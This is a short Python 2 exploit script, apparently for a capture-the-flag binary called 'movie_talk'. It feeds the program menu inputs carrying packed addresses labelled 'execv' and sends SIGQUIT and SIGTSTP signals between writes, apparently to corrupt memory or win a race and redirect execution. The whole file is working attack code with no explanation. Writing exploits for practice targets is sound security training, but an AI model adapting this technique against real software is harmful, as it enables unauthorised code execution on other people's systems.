import subprocess
import time
import signal, sys
import struct

fd = subprocess.Popen("./movie_talk", stdin=subprocess.PIPE)
#fd = subprocess.Popen("/bin/ls", stdin=subprocess.PIPE)
print "PID : " + str(fd.pid)
stdin = fd.stdin
#stdout = fd.stdout
execv = struct.pack('<I', 0x400e40f0)
#execv = struct.pack('<I', 0x4006b280)
execv = struct.pack('<I', 0x400e4290)
stdin.write("1\n")
stdin.write(execv + "bbbbccccdddd\n")
stdin.write("1\n")
stdin.write("0\n")

time.sleep(4);

stdin.write("3\n");

time.sleep(4);

stdin.write("1\n")
stdin.write(execv + "cbbbccccdddd\n")
stdin.write("1\n")
stdin.write("0\n")

time.sleep(4)

stdin.write("3\n")

time.sleep(4)

fd.send_signal(3)
stdin.write("1\n")
time.sleep(1)
fd.send_signal(20)

stdin.write(execv + "dbbbccccdddd\n")
stdin.write("1\n")
stdin.write("0\n")

stdin.write(execv + "ebbbccccdddd\n")
stdin.write("1\n")
stdin.write("0\n")

time.sleep(5)

stdin.write("3\n")

time.sleep(5)

#fd.kill()
raw_input()
